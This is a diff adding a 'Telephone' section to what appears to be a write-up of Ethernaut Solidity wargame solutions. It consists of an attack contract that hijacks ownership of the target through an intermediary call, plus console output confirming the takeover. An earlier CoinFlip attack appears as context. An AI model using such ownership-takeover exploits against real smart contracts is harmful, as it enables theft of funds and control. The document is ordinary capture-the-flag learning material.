@@ -58,3 +58,35 @@ contract coinflipAttack {
 < '0xb13583134DA43E7aAeE1a8E2d1BaFb8Bc03A10d7'
 > await contract.consecutiveWins()    ( Calling this function 10 times )
 ```
+
+## 4. Telephone
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import"./telephone.sol";
+
+contract TelephoneHack {
+    
+    Telephone public telephonehack;
+
+  constructor(address _address) public {
+    telephonehack = Telephone(_address);
+  }
+
+  function Attack(address _address) public {
+        telephonehack.changeOwner(_address);
+    }
+  
+}
+
+
+> contract.address
+< '0x0b6F6CE4BCfB70525A31454292017F640C10c768'
+
+> player
+< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
+
+> await contract.owner()
+< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
+```
